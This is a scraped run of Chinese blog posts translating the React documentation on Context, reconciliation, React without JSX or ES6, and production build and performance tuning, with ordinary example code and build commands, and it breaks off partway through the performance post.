1234567891011121314151617import &#123;ThemeContext&#125; from './theme-context';function ThemedButton(props) &#123; return ( &lt;ThemeContext.Consumer&gt; &#123;theme =&gt; ( &lt;button &#123;...props&#125; style=&#123;&#123;backgroundColor: theme.background&#125;&#125; /&gt; )&#125; &lt;/ThemeContext.Consumer&gt; );&#125;export default ThemedButton; app.js: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import &#123;ThemeContext, themes&#125; from './theme-context';import ThemedButton from './button';// 一个使用到ThemedButton组件的中间组件function Toolbar(props) &#123; return ( &lt;ThemedButton onClick=&#123;props.changeTheme&#125;&gt; Change Theme &lt;/ThemedButton&gt; );&#125;class App extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; theme: themes.light, &#125;; this.toggleTheme = () =&gt; &#123; this.setState(state =&gt; (&#123; theme: state.theme === themes.dark ? themes.light : themes.dark, &#125;)); &#125;; &#125; render() &#123; // ThemedButton 位于 ThemeProvider 内 // 在外部使用时使用来自 state 里面的 theme // 默认 dark theme return ( &lt;Page&gt; &lt;ThemeContext.Provider value=&#123;this.state.theme&#125;&gt; &lt;Toolbar changeTheme=&#123;this.toggleTheme&#125; /&gt; &lt;/ThemeContext.Provider&gt; &lt;Section&gt; &lt;ThemedButton /&gt; &lt;/Section&gt; &lt;/Page&gt; ); &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.root); 七、父子耦合 Context 可以构建 API 使得父组件和子组件进行相互通信。例如 React Router V4 就是使用这种方式的一个库： 123456789101112131415161718192021import &#123; BrowserRouter as Router, Route, Link &#125; from 'react-router-dom';const BasicExample = () =&gt; ( &lt;Router&gt; &lt;div&gt; &lt;ul&gt; &lt;li&gt;&lt;Link to=\"/\"&gt;Home&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/about\"&gt;About&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/topics\"&gt;Topics&lt;/Link&gt;&lt;/li&gt; &lt;/ul&gt; &lt;hr /&gt; &lt;Route exact path=\"/\" component=&#123;Home&#125; /&gt; &lt;Route path=\"/about\" component=&#123;About&#125; /&gt; &lt;Route path=\"/topics\" component=&#123;Topics&#125; /&gt; &lt;/div&gt; &lt;/Router&gt;);// 从 Router 组件向下传递一些信息，每一个 Link 和 Route 都可以沟通回到包含容器 Router。 在你使用类似的 API 构建组件之前，考虑是否有一个更加的替代方案。例如如果你喜欢你可以将整个 React 组件作为props 传入。 八、作用于多个上下文 为了保持 context 快速进行二次渲染，React 需要使每一个 Consumer 在组件树中成为一个单独的节点： 1234567891011121314151617181920212223242526272829303132333435// 主题上下文, 默认lightconst ThemeContext = React.createContext('light');// 登陆用户上下文const UserContext = React.createContext();// 一个依赖于两个上下文的中间组件function Toolbar(props) &#123; return ( &lt;ThemeContext.Consumer&gt; &#123;theme =&gt; ( &lt;UserContext.Consumer&gt; &#123;user =&gt; ( &lt;ProfilePage user=&#123;user&#125; theme=&#123;theme&#125; /&gt; )&#125; &lt;/UserContext.Consumer&gt; )&#125; &lt;/ThemeContext.Consumer&gt; );&#125;class App extends React.Component &#123; render() &#123; const &#123;signedInUser, theme&#125; = this.props; // App组件提供上下文的初始值 return ( &lt;ThemeContext.Provider value=&#123;theme&#125;&gt; &lt;UserContext.Provider value=&#123;signedInUser&#125;&gt; &lt;Toolbar /&gt; &lt;/UserContext.Provider&gt; &lt;/ThemeContext.Provider&gt; ); &#125;&#125; 如果两个或者多个上下文的值经常被一起使用，也许你需要考虑你自己渲染属性的组件提供给它们。 九、生命周期中引用 Context 如果 contextTypes 在组件中定义，下列的生命周期方法将接受一个额外的参数，context 对象： 1）constructor(props, context) 2）componentWillReceiveProps(nextProps, nextContext) 3）shouldComponentUpdate(nextProps, nextState, nextContext) 4）componentWillUpdate(nextProps, nextState, nextContext) 5）componentDidUpdate(prevProps, prevState, prevContext) 注意：从 React 16 开始，componentDidUpdate 不再接收 prevContext。 在生命周期方法中从上下文访问值是一种相对常见的用例。而不是将上下文添加到每个生命周期方法中，只需要将它作为一个 props 传递，然后像通常使用 props 一样去使用它： 12345678910111213141516171819202122232425class Button extends React.Component &#123; componentDidMount() &#123; // ThemeContext value is this.props.theme &#125; componentDidUpdate(prevProps, prevState) &#123; // Previous ThemeContext value is prevProps.theme // New ThemeContext value is this.props.theme &#125; render() &#123; const &#123;theme, children&#125; = this.props; return ( &lt;button className=&#123;theme ? 'dark' : 'light'&#125;&gt; &#123;children&#125; &lt;/button&gt; ); &#125;&#125;export default props =&gt; ( &lt;ThemeContext.Consumer&gt; &#123;theme =&gt; &lt;Button &#123;...props&#125; theme=&#123;theme&#125; /&gt;&#125; &lt;/ThemeContext.Consumer&gt;); 十、高阶组件中的 Context 某些类型的上下文被许多组件（例如主题或者地点信息）共用。使用 &lt; Context.Consumer &gt; 元素显示地封装每个依赖项是冗余的。这里 higher-order component 可以帮助我们解决这个问题。 例如，一个按钮组件也许被作用于一个主题 context： 123456789const ThemeContext = React.createContext('light');function ThemedButton(props) &#123; return ( &lt;ThemeContext.Consumer&gt; &#123;theme =&gt; &lt;button className=&#123;theme&#125; &#123;...props&#125; /&gt;&#125; &lt;/ThemeContext.Consumer&gt; );&#125; 这对于少量组件来说并没有毛病，但是如果我们想在很多地方使用主题上下文呢？我们可以创建一个命名为 withTheme 高阶组件： 123456789101112131415const ThemeContext = React.createContext('light');// 在函数中引入组件export function withTheme(Component) &#123; // 然后返回另一个组件 return function ThemedComponent(props) &#123; // 最后使用context theme渲染这个被封装组件 // 注意我们照常引用了被添加的属性 return ( &lt;ThemeContext.Consumer&gt; &#123;theme =&gt; &lt;Component &#123;...props&#125; theme=&#123;theme&#125; /&gt;&#125; &lt;/ThemeContext.Consumer&gt; ); &#125;;&#125; 目前任何组件都依赖于主题 context，它们都可以很容易的使用我们创建的 withTheme 函数进行订阅: 12345function Button(&#123;theme, ...rest&#125;) &#123; return &lt;button className=&#123;theme&#125; &#123;...rest&#125; /&gt;;&#125;const ThemedButton = withTheme(Button); 十一、转发 Refs 一个关于渲染属性 API 的问题是 refs 不会自动的传递给被封装的元素。为了解决这个问题，使用 React.forwardRef： fancy-button.js： 1234567891011121314151617class FancyButton extends React.Component &#123; focus() &#123; // ... &#125; // ...&#125;// 使用 context 传递当前的 \"theme\" 给 FancyButton.// 使用 forwardRef 传递 refs 给 FancyButton 也是可以的.export default React.forwardRef((props, ref) =&gt; ( &lt;ThemeContext.Consumer&gt; &#123;theme =&gt; ( &lt;FancyButton &#123;...props&#125; theme=&#123;theme&#125; ref=&#123;ref&#125; /&gt; )&#125; &lt;/ThemeContext.Consumer&gt;)); app.js: 12345678910import FancyButton from './fancy-button';const ref = React.createRef();// ref属性将指向 FancyButton 组件,// ThemeContext.Consumer 没有包裹它// 这意味着我们可以调用 FancyButton 的方法就像这样 ref.current.focus()&lt;FancyButton ref=&#123;ref&#125; onClick=&#123;handleClick&#125;&gt; Click me!&lt;/FancyButton&gt;; 十二、告诫 因为 context 中使用 reference identity 确定何时重新渲染，在 Consumer 中，当一个 Provider 的父节点重新渲染的时候，有一些问题可能触发意外的渲染。例如下面的代码，所有的 Consumner 在 Provider 重新渲染之时，每次都将重新渲染，因为一个新的对象总是被创建对应 Provider 里的 value： 123456789class App extends React.Component &#123; render() &#123; return ( &lt;Provider value=&#123;&#123;something: 'something'&#125;&#125;&gt; &lt;Toolbar /&gt; &lt;/Provider&gt; ); &#125;&#125; 为了防止这样, 提升 value 到父节点的 state 里: 123456789101112131415class App extends React.Component &#123; constructor(props) &#123; this.state = &#123; value: &#123;something: 'something'&#125;, &#125;; &#125; render() &#123; return ( &lt;Provider value=&#123;this.state.value&#125;&gt; &lt;Toolbar /&gt; &lt;/Provider&gt; ); &#125;&#125; 十三、更新 Context（老） React 有一个 API 更新 context，但是它打破了基本流程，不应该使用。 getChildContext 函数将会在每次 state 或者 props 改变时调用。为了更新 context 中的数据，使用 this.setState 触发本地状态的更新。这将触发一个新的 context 并且数据的改变可以被子元素收到： 1234567891011121314151617181920212223242526272829303132const PropTypes = require('prop-types');class MediaQuery extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;type:'desktop'&#125;; &#125; getChildContext() &#123; return &#123;type: this.state.type&#125;; &#125; componentDidMount() &#123; const checkMediaQuery = () =&gt; &#123; const type = window.matchMedia(\"(min-width: 1025px)\").matches ? 'desktop' : 'mobile'; if (type !== this.state.type) &#123; this.setState(&#123;type&#125;); &#125; &#125;; window.addEventListener('resize', checkMediaQuery); checkMediaQuery(); &#125; render() &#123; return this.props.children; &#125;&#125;MediaQuery.childContextTypes = &#123; type: PropTypes.string&#125;; 问题在于，组件提供的 context 值改变，后代元素如果 shouldComponentUpdate 返回 false 那么 context 的将不会更新。这使得使用 context 的组件完全失控，所以基本上没有办法可靠的更新 context。 这篇博客文章 很好的解释了为什么这是一个问题并如果绕过它。 十四、补充： 本文中，content 的使用，一种是 childContextTypes、getChildContext、contextTypes，另一种是 createContext、Provider、Consumer，前者是老版本的方式，由于和 shouldComponentUpdate 搭配使用时容易出问题，便有了新版本。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之21-一致性比较(Reconciliation)","slug":"React-gw-21","date":"2018-07-08T13:01:52.000Z","updated":"2019-01-25T03:46:46.610Z","comments":true,"path":"2018/07/08/React-gw-21/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-21/","excerpt":"","text":"一、前言 React 提供了一组声明式 API，让你可以不必关心每次更新的变化，这使得应用的编写容易了很多，但在 React 中如何实现并不是很清晰，这篇文章解释了 React 对比算法的选择从而让组件的更新可预测，并使得高性能应用足够快。 二、目的 当你使用 React，在任何一个单点时刻你可以认为 render() 函数的作用是创建 React 元素树。在下一个 state 或 props 更新时，render() 函数将会返回一个不同的 React 元素树。接下来 React 将会找出如何高效地更新 UI 来匹配最近时刻的 React 元素树。 目前存在大量通用的方法能够以最少的操作步骤将一个树转化成另外一棵树。然而这个算法是复杂度为O(n3)，其中 n 为树中元素的个数。 如果你在 React 中展示 1000 个元素，那么每次更新都需要 10 亿次的比较，这样的代价过于昂贵。然而 React 基于以下两个假设实现了时间复杂度为 O(n) 的算法（事实上，这些假设在几乎所有的用例中都是有效的）: 1）不同类型的两个元素将会产生不同的树。 2）开发人员可以使用一个 key prop 来指示在不同的渲染中那个那些元素可以保持稳定。 三、对比算法（Diffing） 当比较不同的两个树，React 首先比较两个根元素，根据根的类型不同，它有不同的行为。 1、元素类型不相同： 无论什么时候，当根元素类型不同时，React 将会销毁原先的树并重写构建新的树。从 &lt; a &gt; 到 &lt; img &gt; ，或者从 &lt; Article &gt; 到 &lt; Comment &gt; ，从 &lt; Button &gt; 到 &lt; div &gt; – 这些都将导致全部重新构建。 当销毁原先的树时，之前的 DOM 节点将销毁，实例组件执行 componentWillUnmount()。当构建新的一个树，新的 DOM 节点将会插入 DOM 中，组件将会执行 componentWillMount() 以及 componentDidMount()，任何与旧树有关的状态都将丢弃。 根节点以下的任何组件都会被卸载(unmounted)，其状态都会丢失。例如，当比较下面情况时，会销毁旧的 Counter，并重新装载（remount）一个新的: 1234567&lt;div&gt; &lt;Counter /&gt;&lt;/div&gt;&lt;span&gt; &lt;Counter /&gt;&lt;/span&gt; 2、DOM元素类型相同： 当比较两个相同类型的 React DOM 元素时，React 检查它们的属性，保留相同的底层 DOM 节点，只更新反生改变的属性。例如当比较下面两个元素时，React 会仅修改底层 DOM 节点的 className 属性： 123&lt;div className=\"before\" title=\"stuff\" /&gt;&lt;div className=\"after\" title=\"stuff\" /&gt; 当更新 style 属性，React 也会仅仅只更新已经改变的属性，例如下面当 React 对两个元素进行转化的时候，仅会修改 color，而不会修改 fontWeight: 123&lt;div style=&#123;&#123;'&#123;&#123;'&#125;&#125;color: 'red', fontWeight: 'bold'&#125;&#125; /&gt;&lt;div style=&#123;&#123;'&#123;&#123;'&#125;&#125;color: 'green', fontWeight: 'bold'&#125;&#125; /&gt; 在处理完当前 DOM 节点后，React 会递归处理子节点。 3、组件元素类型相同： 当一个组件更新的时候，组件实例保持不变，以便在渲染中保持 state。React 会更新组件实例的属性来匹配新的元素，并在元素实例上调用 componentWillReceiveProps() 和 componentWillUpdate()。 接下来，render() 方法会被调用并且对比算法对上一次的结果和新的结果进行递归。 4、子元素递归： 默认情况下，当递归一个 DOM 节点的子节点时，React 仅在同一时间点递归两个子节点列表，并在有不同时产生一个变更。 例如，当给子元素末尾添加一个元素，在两棵树之间转化中性能就不错: 12345678910&lt;ul&gt; &lt;li&gt;first&lt;/li&gt; &lt;li&gt;second&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt; &lt;li&gt;first&lt;/li&gt; &lt;li&gt;second&lt;/li&gt; &lt;li&gt;third&lt;/li&gt;&lt;/ul&gt; React 会比较两个 &lt; li &gt;first&lt; /li &gt; 树与两个 &lt; li &gt;second&lt; /li &gt; 树，然后插入 &lt; li &gt;third&lt; /li &gt; 树。 如果在开始处插入一个节点也是这样简单地实现，那么性能将会很差。例如，在下面两棵树的转化中性能就不佳: 12345678910&lt;ul&gt; &lt;li&gt;Duke&lt;/li&gt; &lt;li&gt;Villanova&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt; &lt;li&gt;Connecticut&lt;/li&gt; &lt;li&gt;Duke&lt;/li&gt; &lt;li&gt;Villanova&lt;/li&gt;&lt;/ul&gt; React 将会改变每一个子节点而没有意识到需要保留 Duke 和 Villanova 两个子树。这种低效是一个问题。 5、Keys： 为了解决这个问题，React 支持一个 key 属性。当子节点有了 key，React 使用这个 key 去比较原来的树的子节点和之后树的子节点。 例如，添加一个 key 到我们上面那个低效的例子中可以使树的转换变高效： 12345678910&lt;ul&gt; &lt;li key=\"2015\"&gt;Duke&lt;/li&gt; &lt;li key=\"2016\"&gt;Villanova&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt; &lt;li key=\"2014\"&gt;Connecticut&lt;/li&gt; &lt;li key=\"2015\"&gt;Duke&lt;/li&gt; &lt;li key=\"2016\"&gt;Villanova&lt;/li&gt;&lt;/ul&gt; 现在 React 知道有’2014’ key 的元素是新的， key 为’2015’ 和’2016’的两个元素仅仅只是被移动而已。 实际上，找到一个 key 通常不难。你所将要展示的组件一般都有唯一的 ID，因此你的数据可以作为 key 的来源： 1&lt;li key=&#123;item.id&#125;&gt;&#123;item.name&#125;&lt;/li&gt; 当情况不同时，你可以添加一个新的 ID 属性到你的数据模型，或者是 hash 一部分内容生成一个 key。这个 key 需要在它的兄弟节点中是唯一的就可以了，不需要是全局唯一。 作为最后的手段，你可以将数组中的索引作为 key。如果它们从不重新排序，它们工作也很好，但是如果存在重新排序，性能将会很差。当索引用作key时，组件状态在重新排序时也会有问题。组件实例基于 key 进行更新和重用。如果 key 是索引，则 item 的顺序变化会改变 key 值。这将导致受控组件的状态可能会以意想不到的方式混淆和更新。 四、权衡利弊 牢记对比算法的实现细节非常重要。React 会在每个操作上重新渲染整个应用，最终的结果可能是相同的。因此我们经常细化启发式算法，以便优化性能。 在目前实现中，可以表明一个事实，即子树在其兄弟节点中移动，但你无法告知其移动到哪。该算法会重渲整个子树。 因为 React 依赖这个启发式，如果它们背后的假设没有得到满足，性能将会受到影响： 1）算法不会尝试匹配不同节点类型的子树。如果你发现在有类似输出的两个不同节点类型中相互切换，你可能需要将其转化成同种类型，事实上，我们没有在其中发现问题。 2）keys 应该是稳定的、可预测的并且是唯一的。不稳定的 key (类似于 Math.random() 函数的结果)可能会产生非常多的组件实例并且 DOM 节点也会非必要性的重新创建。这将会造成极大的性能损失和组件内 state 的丢失。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之20-不使用JSX","slug":"React-gw-20","date":"2018-07-08T12:01:52.000Z","updated":"2019-01-24T13:25:15.198Z","comments":true,"path":"2018/07/08/React-gw-20/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-20/","excerpt":"","text":"一、不使用JSX 编写 React 的时候，JSX 并不是必须的。当你不想在你的构建环境中设置编译器，那么不使用 JSX 的 React 是非常方便的。每一个 JSX 元素都是调用 React.createElement(component, props, …children) 的语法糖，因此，任何你使用 JSX 来做事都可以通过纯 JavaScript 实现。 例如，下面代码是通过JSX实现的: 12345678910class Hello extends React.Component &#123; render() &#123; return &lt;div&gt;Hello &#123;this.props.toWhat&#125;&lt;/div&gt;; &#125;&#125;ReactDOM.render( &lt;Hello toWhat=\"World\" /&gt;, document.getElementById('root')); 可以被编译成不使用JSX的代码: 12345678910class Hello extends React.Component &#123; render() &#123; return React.createElement('div', null, `Hello $&#123;this.props.toWhat&#125;`); &#125;&#125;ReactDOM.render( React.createElement(Hello, &#123;toWhat: 'World'&#125;, null), document.getElementById('root')); 如果想查看更多 JSX 转化为 JavaScript 的实例，可以尝试在线 Babel编译器 一个组件可以是一个字符串，或者也可以是 React.Component 的子类。当组件是无状态组件的时候，它也可以是一个普通的函数。 如果你厌倦了使用 React.createElement，另一个常见的模式是将其赋值给一个缩写，如果你使用 React.createElement 的缩写形式，就可以很方便的在不通过 JSX 情况下使用 React: 123456const e = React.createElement;ReactDOM.render( e('div', null, 'Hello World'), document.getElementById('root')); 其它选择的话，你可以去参考社区上的项目例如 react-hyperscript 和 hyperscript-helpers。它们都提供了一些简洁的语法。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之19-不使用ES6","slug":"React-gw-19","date":"2018-07-08T11:01:52.000Z","updated":"2019-01-23T15:00:14.169Z","comments":true,"path":"2018/07/08/React-gw-19/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-19/","excerpt":"","text":"一、前言 通常我们会用 JavaScript 的 class 关键字来创建 React 组件： 12345class Greeting extends React.Component &#123; render() &#123; return &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt;; &#125;&#125; 如果你不打算使用 ES6，你也可以使用 create-react-class 模块来创建： 123456var createReactClass = require('create-react-class');var Greeting = createReactClass(&#123; render: function() &#123; return &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt;; &#125;&#125;); 除了一些例外，ES6 class API 非常类似于函数 createReactClass() 。 二、声明默认属性 如果使用 class 关键字创建组件，可以直接把自定义属性对象写到类的 defaultProps 属性中： 1234567class Greeting extends React.Component &#123; // ...&#125;Greeting.defaultProps = &#123; name: 'Mary'&#125;; 如果使用 createReactClass 方法创建组件，那就需要在参数对象中定义 getDefaultProps 方法，并且在这个方法中返回包含自定义属性的对象： 12345678910var Greeting = createReactClass(&#123; getDefaultProps: function() &#123; return &#123; name: 'Mary' &#125;; &#125;, // ...&#125;); 三、设置初始化状态 如果使用 class 关键字创建组件，你可以通过在 constructor 中给 this.state 赋值的方式来定义组件的初始状态： 1234567class Counter extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;count: props.initialCount&#125;; &#125; // ...&#125; 如果使用 createReactClass 方法创建组件，你就需要多写一个 getInitialState 方法，并让这个方法返回你要定义的初始属性： 123456var Counter = createReactClass(&#123; getInitialState: function() &#123; return &#123;count: this.props.initialCount&#125;; &#125;, // ...&#125;); 四、自动绑定 对于使用 class 关键字创建的 React 组件，组件中的方法是不会自动绑定 this 的。类似地，通过 ES6 class 生成的实例，实例上的方法也不会绑定 this。因此，你需要在 constructor 中为方法手动添加 .bind(this)： 123456789101112131415161718192021class SayHello extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;message: 'Hello!'&#125;; // 这一行很重要！ this.handleClick = this.handleClick.bind(this); &#125; handleClick() &#123; alert(this.state.message); &#125; render() &#123; // 因为 `this.handleClick` 是绑定的，所以我们可以使用它作为一个事件处理程序。 return ( &lt;button onClick=&#123;this.handleClick&#125;&gt; Say hello &lt;/button&gt; ); &#125;&#125; 在 createReactClass() 中，并不需要这么做，因为方法可以自动绑定: 1234567891011121314151617var SayHello = createReactClass(&#123; getInitialState: function() &#123; return &#123;message: 'Hello!'&#125;; &#125;, handleClick: function() &#123; alert(this.state.message); &#125;, render: function() &#123; return ( &lt;button onClick=&#123;this.handleClick&#125;&gt; Say hello &lt;/button&gt; ); &#125;&#125;); 这意味着在使用 class 关键字创建组件的方式下对于事件处理函数你需要编写更多的样本代码，但是在大型应用中具有更好的性能。如果你觉得上面这个写法很麻烦，那么可以尝试一下目前还处于实验性阶段的 Babel 插件 Class Properties： 12345678910111213141516171819class SayHello extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;message: 'Hello!'&#125;; &#125; // 警告：这个语法是实验性的！ // 这里使用箭头绑定方法： handleClick = () =&gt; &#123; alert(this.state.message); &#125; render() &#123; return ( &lt;button onClick=&#123;this.handleClick&#125;&gt; Say hello &lt;/button&gt; ); &#125;&#125; 注意，上述语法是实验性的，并且这个语法将来可能会发生变化，或者这个提案可能不会纳入语言范畴。 如果你想更稳妥的方法，你有以下选择： 1）在构造函数中绑定方法。 2）使用箭头函数，例如，onClick={(e) =&gt; this.handleClick(e)}。 3）保持使用 createReactClass。 五、Mixins(混入) ES6 是不支持 mixin 的，因此如果你使用 class 关键字创建组件时，是不支持 mixins 的。我们也在使用 mixins 的情况下发现了部分问题，所以我们不推荐目前使用。 有时不同的组件可能会共用部分方法，这些方法会被称为横切关注点(cross-cutting concerns)。createReactClass 可以允许你使用 mixins。 一个常见的使用场景是组件间隔一段时间自我更新。使用 setInterval() 很容易实现，但是为了节省内存空间必须在不使用时取消。React 提供了生命周期方法，可以通知你组件创建和销毁。我们编写一个简单的 mixin，执行方法可以提供 setInterval() 方法，并且在组件销毁时可以自动被清除： 1234567891011121314151617181920212223242526272829303132333435363738var SetIntervalMixin = &#123; componentWillMount: function() &#123; this.intervals = []; &#125;, setInterval: function() &#123; this.intervals.push(setInterval.apply(null, arguments)); &#125;, componentWillUnmount: function() &#123; this.intervals.forEach(clearInterval); &#125;&#125;;var createReactClass = require('create-react-class');var TickTock = createReactClass(&#123; mixins: [SetIntervalMixin], // Use the mixin getInitialState: function() &#123; return &#123;seconds: 0&#125;; &#125;, componentDidMount: function() &#123; this.setInterval(this.tick, 1000); // Call a method on the mixin &#125;, tick: function() &#123; this.setState(&#123;seconds: this.state.seconds + 1&#125;); &#125;, render: function() &#123; return ( &lt;p&gt; React has been running for &#123;this.state.seconds&#125; seconds. &lt;/p&gt; ); &#125;&#125;);ReactDOM.render( &lt;TickTock /&gt;, document.getElementById('example')); 如果一个组件使用多个 mixin，不同的 mixin 中定义了相同的生命周期方法(例如，不容的 mixin 中都想要在组件销毁时做相应的清理)，这些生命周期函数都会被调用。在组件内部的生命周期方法执行完毕后，mixin 中的方法将会按照 mixin 的顺序依次执行。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之18-性能优化","slug":"React-gw-18","date":"2018-07-08T10:01:52.000Z","updated":"2019-01-25T10:18:59.578Z","comments":true,"path":"2018/07/08/React-gw-18/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-18/","excerpt":"","text":"一、前言 更新 UI 时，React 在内部使用几种巧妙的技术来最小化 DOM 操作的数量。对于大多数应用，使用 React 不需要做太多的优化工作就可以快速创建用户界面。除此之外还有一些优化 React 应用性能的办法。 二、使用生产版本 在 React 应用中检测性能问题时，请务必使用压缩过的生产版本。默认情况下，React 包含很多在开发过程中很有帮助的警告。然而这会导致 React 更大更慢。因此在部署应用时，请确认使用了生产版本。 如果你不确定构建过程是否正确，可以在 chrome 中安装 React开发者工具 。 当你访问一个生产模式的 React 页面时，这个工具的图标会有一个黑色的背景： 如果你访问一个开发模式的 React 网站时，这个工具的图标会有一个红色的背景： 最好在开发应用时使用开发模式，部署应用时换为生产模式。以下是构建生产应用的流程： 1、Create React App： 如果你的项目是以 Create React App 创建的，运行： 1npm run build 这将会在该项目的 build/ 文件夹内创建一个生产版本的应用。注意只有发布项目时才有必要这样做，正常开发时使用 npm start 。 2、单文件构建： 我们提供压缩好的生产版本的 React 和 React DOM 文件: 12&lt;script src=\"https://unpkg.com/react@15/dist/react.min.js\"&gt;&lt;/script&gt;&lt;script src=\"https://unpkg.com/react-dom@15/dist/react-dom.min.js\"&gt;&lt;/script&gt; 注意只有结尾为 .min.js 的 React 文件才是适合生产使用的。 3、Brunch： 为了创建最高效的 Brunch 生产版本，需要安装 uglify-js-brunch 插件： 12345# 如果使用 npmnpm install --save-dev uglify-js-brunch# 如果使用 Yarnyarn add --dev uglify-js-brunch 然后，为了构建生产版本，在 build 命令后添加 -p 参数： 1brunch build -p 注意只有生产版本需要这样操作。不要在开发环境中安装这个插件或者使用 -p 参数，因为它会隐藏掉有用的 React 警告并使构建过程更慢。 4、Browserify： 为了创建最高效的 Browserify 生产版本，需要安装一些插件： 12345# 如果使用 npmnpm install --save-dev bundle-collapser envify uglify-js uglifyify # 如果使用 Yarnyarn add --dev bundle-collapser envify uglify-js uglifyify 为了构建生产版本，务必添加这些设置指令 (参数很重要)： 1）envify 该插件确保正确的编译环境，全局安装（-g）。 2）uglifyify 该插件移除了开发接口。全局安装（-g）。 3）bundle-collapser 该插件用数字替代了长长的模块ID。 4）最后，以上结果都被输添加至 uglify-js 来得到整合。( [了解原因]https://github.com/hughsk/uglifyify#motivationusage) )。 举个例子： 12345browserify ./index.js \\ -g [ envify --NODE_ENV production ] \\ -g uglifyify \\ -p bundle-collapser/plugin \\ | uglifyjs --compress --mangle &gt; ./bundle.js 注意：包的名称是 uglify-js，但是它提供的文件叫 uglifyjs。这不是一个错字。只有生产版本需要这样操作。不要在开发环境中安装这些插件，因为它们会隐藏掉有用的 React 警告并使构建过程更慢。 5、Rollup： 为了创建最高效的 Rollup 生产版本，需要安装一些插件： 12345# 如果使用 npmnpm install --save-dev rollup-plugin-commonjs rollup-plugin-replace rollup-plugin-uglify # 如果使用 Yarnyarn add --dev rollup-plugin-commonjs rollup-plugin-replace rollup-plugin-uglify 为了构建生产版本，务必添加这些插件 (参数很重要): 1）replace 该插件确保正确的编译环境。 2）commonjs 该插件在 Rollup 内提供对 CommonJS 的支持。 3）uglify 该插件压缩生成最终版本。 举个例子： 123456789plugins: [ // ... require('rollup-plugin-replace')(&#123; 'process.env.NODE_ENV': JSON.stringify('production') &#125;), require('rollup-plugin-commonjs')(), require('rollup-plugin-uglify')(), // ...] 一个完整的安装例子 查看这个 gist。 注意只有生产版本需要这样操作。你不应该在开发环境中应用 uglify 插件 和 replace 插件的 ‘production’ 值，因为它们会隐藏掉有用的 React 警告并使构建过程更慢。 6、webpack： 注意：如果你正在使用 Create React App 方式，参考上述文档。这里只适用于直接配置Webpack的情况。 为了创建最高效的Webpack生产版本，需要在生产版本的配置中添加这些插件： 123456new webpack.DefinePlugin(&#123; 'process.env': &#123; NODE_ENV: JSON.stringify('production') &#125;&#125;),new webpack.optimize.UglifyJsPlugin() 了解更多参见 Webpack文档 。 注意只有生产版本需要这样操作。你不应该在开发环境中应用 UglifyJsPlugin 插件 和 DefinePlugin 插件的 ‘production’ 值，因为它们会隐藏掉有用的 React 警告并使构建过程更慢。 三、使用Chrome性能分析工具分析组件性能 在开发模式下，在支持的浏览器内使用性能工具可以直观的了解组件何时 装载(mount)，更新(update) 和 卸载(unmount)。例如： 在 Chrome 中操作如下: 1）通过添加 ?react_perf 查询字段加载你的应用(例如：http://localhost:3000/?react_perf)。 2）打开 Chrome DevTools Performance 并点击 Record 。 3）执行你想要分析的操作，不要超过20秒，否则 Chrome 可能会挂起。 4）停止记录。 5）在 User Timing 标签下，React事件将会分组列出。 有关更详细的演练，请查看 [Ben Schwarz]https://building.calibreapp.com/debugging-react-performance-with-react-16-and-chrome-devtools-c90698a522ad) 的这篇文章. 注意，上述数字是相对的，组件会在生产环境中会更快。然而这对你分析由于错误导致不相关的组件的更新、分析组件更新的深度和频率很有帮助。目前 Chrome ，Edge 和 IE 支持该特性，但是我们使用了标准的 User Timing API ,因此我们期待将来会有更多的浏览器支持。 四、避免重新渲染 React 构建并维护渲染 UI 的内部表示，它包括你从组件中返回的 React 元素。这些内部状态使得 React 只有在必要的情况下才会创建 DOM 节点和访问存在的 DOM 节点，因为对 JavaScript 对象的操作是比 DOM 操作更快。这被称为虚拟 DOM，React Native 也是基于上述原理。 当组件的 props 和 state 改变时，React 通过比较新返回的元素和之前渲染的元素来决定是否有必要更新 DOM 元素。当二者不相等时则更新 DOM 元素。 现在你可以使用 React DevTools 可视化这些重新渲染的虚拟DOM： 1）Chrome Browser Extension 2）Firefox Browser Extension 3）[Standalone Node Package]https://www.npmjs.com/package/react-devtools) 在开发者工具的控制台中，选择 React 选项卡中的 Highlight Updates (高亮显示更新) 选项： 与你的页面进行交互，你应该会看到，所有重新渲染的组件周围都会出现高亮显示的边框。反过来，这可以让你知道没有必要重新渲染的组件。 你可以查看 Ben Edelstein 的 博客文章 了解更多关于 React DevTools 功能的信息。考虑下面这个例子： 